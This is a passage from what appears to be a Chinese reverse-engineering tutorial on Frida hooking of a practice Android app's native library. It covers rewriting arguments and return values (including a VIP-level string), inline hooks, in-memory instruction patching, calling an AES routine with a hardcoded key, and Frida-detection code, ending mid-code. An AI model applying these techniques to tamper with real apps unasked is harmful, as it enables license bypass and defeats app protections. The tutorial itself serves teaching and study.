function_">log</span>(retval);<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;retval&quot;</span>,retval.<span class="hljs-title function_">toInt32</span>());<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>字符串类型</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> helloAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>,<span class="hljs-string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);<br>        <span class="hljs-keyword">if</span>(helloAddr != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(helloAddr,&#123;<br>                <span class="hljs-comment">//onEnter里可以打印和修改参数</span><br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args传入参数</span><br>                    <span class="hljs-comment">// 方法一</span><br>                    <span class="hljs-keyword">var</span> jString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(args[<span class="hljs-number">2</span>], <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;参数:&quot;</span>, jString.<span class="hljs-title function_">toString</span>());<br>                    <span class="hljs-comment">// 方法二</span><br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                    <span class="hljs-keyword">var</span> originalStrPtr = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">getStringUtfChars</span>(args[<span class="hljs-number">2</span>], <span class="hljs-literal">null</span>).<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;参数:&quot;</span>, originalStrPtr);<br>                &#125;,<br>                <span class="hljs-comment">//onLeave里可以打印和修改返回值</span><br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    <span class="hljs-keyword">var</span> returnedJString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(retval, <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;返回值:&quot;</span>, returnedJString.<span class="hljs-title function_">toString</span>());<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Native函数的基础Hook修改</strong></p><ul><li>整数型修改</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> helloAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>,<span class="hljs-string">&quot;func_four&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(helloAddr);<br>        <span class="hljs-keyword">if</span>(helloAddr != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(helloAddr,&#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args参数</span><br>                    args[<span class="hljs-number">0</span>] = <span class="hljs-title function_">ptr</span>(<span class="hljs-number">1000</span>); <span class="hljs-comment">//第一个参数修改为整数 1000，先转为指针再赋值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">0</span>]);<br>                      <br>                &#125;,<br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">20000</span>);  <span class="hljs-comment">//返回值修改</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;retval&quot;</span>,retval.<span class="hljs-title function_">toInt32</span>());<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>字符串类型修改</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> helloAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>,<span class="hljs-string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);<br>        <span class="hljs-keyword">if</span>(helloAddr != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(helloAddr,&#123;<br>                <span class="hljs-comment">//onEnter里可以打印和修改参数</span><br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args传入参数</span><br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                    <span class="hljs-keyword">var</span> originalStrPtr = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">getStringUtfChars</span>(args[<span class="hljs-number">2</span>], <span class="hljs-literal">null</span>).<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;参数:&quot;</span>, originalStrPtr);<br>                    <span class="hljs-keyword">var</span> modifiedContent = <span class="hljs-string">&quot;至尊&quot;</span>;<br>                    <span class="hljs-keyword">var</span> newJString = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">newStringUtf</span>(modifiedContent);<br>                    args[<span class="hljs-number">2</span>] = newJString;<br>                &#125;,<br>                <span class="hljs-comment">//onLeave里可以打印和修改返回值</span><br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    <span class="hljs-keyword">var</span> returnedJString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(retval, <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;返回值:&quot;</span>, returnedJString.<span class="hljs-title function_">toString</span>());<br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                    <span class="hljs-keyword">var</span> modifiedContent = <span class="hljs-string">&quot;无敌&quot;</span>;<br>                    <span class="hljs-keyword">var</span> newJString = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">newStringUtf</span>(modifiedContent);<br>                    retval.<span class="hljs-title function_">replace</span>(newJString);<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>SO基址的获取方式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleAddr1 = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>).<span class="hljs-property">base</span>;  <br><span class="hljs-keyword">var</span> moduleAddr2 = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">getModuleByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>).<span class="hljs-property">base</span>;  <br><span class="hljs-keyword">var</span> moduleAddr3 = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>Hook未导出函数与函数地址计算</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest6</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印基址</span><br>        <span class="hljs-keyword">var</span> soAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(soAddr);<br>        <span class="hljs-keyword">var</span> funcaddr = soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1071C</span>);  <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(funcaddr);<br>        <span class="hljs-keyword">if</span>(funcaddr != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcaddr,&#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args参数</span><br> <br>                &#125;,<br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(retval.<span class="hljs-title function_">toInt32</span>());<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>函数地址计算</p><ol><li>安卓里一般32 位的 so 中都是<code>thumb</code>指令，64 位的 so 中都是<code>arm</code>指令</li><li>通过IDA里的opcode bytes来判断，arm 指令为 4 个字节(options -&gt; general -&gt; Number of opcode bytes (non-graph) 输入4)</li><li>thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 + 1<br>arm 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移</li></ol><p>Frida写数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//一般写在app的私有目录里，不然会报错:failed to open file (Permission denied)(实际上就是权限不足)</span><br><span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&quot;/data/user/0/com.zj.wuaipojie/test.txt&quot;</span>;<br><span class="hljs-keyword">var</span> file_handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(file_path, <span class="hljs-string">&quot;wb&quot;</span>);<br><span class="hljs-keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="hljs-literal">null</span>) &#123;<br>        file_handle.<span class="hljs-title function_">write</span>(data); <span class="hljs-comment">//写入数据</span><br>        file_handle.<span class="hljs-title function_">flush</span>(); <span class="hljs-comment">//刷新</span><br>        file_handle.<span class="hljs-title function_">close</span>(); <span class="hljs-comment">//关闭</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Frida_inlineHook与读写汇编</p><p>什么是inlinehook？ Inline hook（内联钩子）是一种在程序运行时修改函数执行流程的技术。<strong>它通过修改函数的原始代码，将目标函数的执行路径重定向到自定义的代码段，从而实现对目标函数的拦截和修改。</strong> 简单来说就是可以对任意地址的指令进行hook读写操作</p><p>Frida的inlinehook不是太稳定，崩溃是基操，另外新版的frida兼容性会比较好</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inline_hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> soAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>    <span class="hljs-keyword">if</span> (soAddr) &#123;<br>        <span class="hljs-keyword">var</span> func_addr = soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x10428</span>);<br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x22</span>); <span class="hljs-comment">//注意此时就没有args概念了</span><br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x22</span> = <span class="hljs-title function_">ptr</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">//赋值方法参考上一节课</span><br>                &#125;,<br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>                &#125;<br>            &#125;<br>            )<br>        &#125;)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将地址的指令解析成汇编</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> soAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br><span class="hljs-keyword">var</span> codeAddr = <span class="hljs-title class_">Instruction</span>.<span class="hljs-title function_">parse</span>(soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x10428</span>));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(codeAddr.<span class="hljs-title function_">toString</span>());<br></code></pre></td></tr></table></figure><p>arm转hex</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> soAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br><span class="hljs-keyword">var</span> codeAddr = soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x10428</span>);<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">patchCode</span>(codeAddr, <span class="hljs-number">4</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">const</span> writer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Arm64Writer</span>(code, &#123; <span class="hljs-attr">pc</span>: codeAddr &#125;);<br>    writer.<span class="hljs-title function_">putBytes</span>(<span class="hljs-title function_">hexToBytes</span>(<span class="hljs-string">&quot;20008052&quot;</span>));<br>    writer.<span class="hljs-title function_">flush</span>();<br>&#125;);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hexToBytes</span>(<span class="hljs-params">str</span>) &#123;<br>    <span class="hljs-keyword">var</span> pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">var</span> len = str.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">if</span> (len % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    len /= <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">var</span> hexA = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        <span class="hljs-keyword">var</span> s = str.<span class="hljs-title function_">substr</span>(pos, <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">var</span> v = <span class="hljs-built_in">parseInt</span>(s, <span class="hljs-number">16</span>);<br>        hexA.<span class="hljs-title function_">push</span>(v);<br>        pos += <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hexA;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>普通函数与jni函数的主动调用</code></p><table><thead><tr><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>void</td><td>无返回值</td></tr><tr><td>pointer</td><td>指针</td></tr><tr><td>int</td><td>整数</td></tr><tr><td>long</td><td>长整数</td></tr><tr><td>char</td><td>字符</td></tr><tr><td>float</td><td>浮点数</td></tr><tr><td>double</td><td>双精度浮点数</td></tr><tr><td>bool</td><td>布尔值</td></tr></tbody></table><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> funcAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1054C</span>);<br><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-comment">//NativeFunction的第一个参数是地址，第二个参数是返回值类型，第三个[]里的是传入的参数类型(有几个就填几个)</span><br><span class="hljs-keyword">var</span> aesAddr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(funcAddr , <span class="hljs-string">&#x27;pointer&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>]);<br><span class="hljs-keyword">var</span> encry_text = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-string">&quot;OOmGYpk6s0qPSXEPp4X31g==&quot;</span>);    <span class="hljs-comment">//开辟一个指针存放字符串       </span><br><span class="hljs-keyword">var</span> key = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-string">&#x27;wuaipojie0123456&#x27;</span>); <br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">aesAddr</span>(encry_text ,key).<span class="hljs-title function_">readCString</span>());<br></code></pre></td></tr></table></figure><h5 id="frida-bypass"><a href="#frida-bypass" class="headerlink" title="frida bypass"></a>frida bypass</h5><hr><p><code>D-Bus检测</code></p><p>D-Bus是一种进程间通信(IPC)和远程过程调用(RPC)机制,最初是为Linux开发的,目的是用一个统一的协议替代现有的和竞争的IPC解决方案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check_dbus</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-comment">// 定义一个socket地址结构体变量sa  </span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> sa;  <br>    <span class="hljs-comment">// 创建一个socket文件描述符  </span><br>    <span class="hljs-type">int</span> sock;  <br>    <span class="hljs-comment">// 定义一个字符数组res，用于存储接收到的数据  </span><br>    <span class="hljs-type">char</span> res[<span class="hljs-number">7</span>];  <br>  <br>    <span class="hljs-comment">// 循环遍历所有可能的端口号，从0到65535  </span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">65535</span>; i++) &#123;  <br>        <span class="hljs-comment">// 创建一个新的socket连接  </span><br>        sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);  <br>        <span class="hljs-comment">// 设置socket地址结构体的端口号  </span><br>        sa.sin_port = <span class="hljs-built_in">htons</span>(i);  <br>        <span class="hljs-comment">// 尝试连接到当前端口  </span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;sa, <span class="hljs-built_in">sizeof</span>(sa)) != <span class="hljs-number">-1</span>) &#123;  <br>            <span class="hljs-comment">// 如果连接成功，记录日志信息，表示发现了一个开放的端口  </span><br>            __android_log_print(ANDROID_LOG_VERBOSE, <span class="hljs-string">&quot;ZJ595&quot;</span>, <span class="hljs-string">&quot;FRIDA DETECTION [1]: Open Port: %d&quot;</span>, i);  <br>            <span class="hljs-comment">// 初始化res数组，清零  </span><br>            <span class="hljs-built_in">memset</span>(res, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);  <br>            <span class="hljs-comment">// 向socket发送一个空字节  </span><br>            <span class="hljs-built_in">send</span>(sock, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 注意这里的NULL被替换为0  </span><br>            <span class="hljs-comment">// 发送AUTH请求  </span><br>            <span class="hljs-built_in">send</span>(sock, <span class="hljs-string">&quot;AUTH\r\n&quot;</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>);  <br>            <span class="hljs-comment">// 等待100微秒  </span><br>            <span class="hljs-built_in">usleep</span>(<span class="hljs-number">100</span>);  <br>            <span class="hljs-comment">// 尝试接收响应  </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">recv</span>(sock, res, <span class="hljs-number">6</span>, MSG_DONTWAIT) != <span class="hljs-number">-1</span>) &#123;  <br>                <span class="hljs-comment">// 如果接收到响应，检查响应内容是否为&quot;REJECT&quot;  </span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(res, <span class="hljs-string">&quot;REJECT&quot;</span>) == <span class="hljs-number">0</span>) &#123;  <br>                    <span class="hljs-comment">// 如果是，关闭socket并返回true，表示检测到了Frida服务器  </span><br>                    <span class="hljs-built_in">close</span>(sock);  <br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// Frida server detected  </span><br>                &#125;  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-comment">// 如果当前端口连接失败或没有检测到Frida服务器，关闭socket  </span><br>        <span class="hljs-built_in">close</span>(sock);  <br>    &#125;  <br>    <span class="hljs-comment">// 如果遍历完所有端口都没有检测到Frida服务器，返回false  </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// No Frida server detected  </span><br>&#125;  <br>  <br></code></pre></td></tr></table></figure><p><code>检测fd</code></p><p>&#x2F;proc&#x2F;pid&#x2F;fd 目录的作用在于提供了一种方便的方式来查看进程的文件描述符信息，这对于调试和监控进程非常有用。通过查看文件描述符信息，可以了解进程打开了哪些文件、网络连接等，帮助开发者和系统管理员进行问题排查和分析工作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check_fd</span><span class="hljs-params">()</span> </span>&#123;  <br>    DIR *dir = <span class="hljs-literal">NULL</span>;  <br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dirent</span> *entry;  <br>    <span class="hljs-type">char</span> link_name[<span class="hljs-number">100</span>];  <br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];  <br>    <span class="hljs-type">bool</span> ret = <span class="hljs-literal">false</span>;  <br>    <span 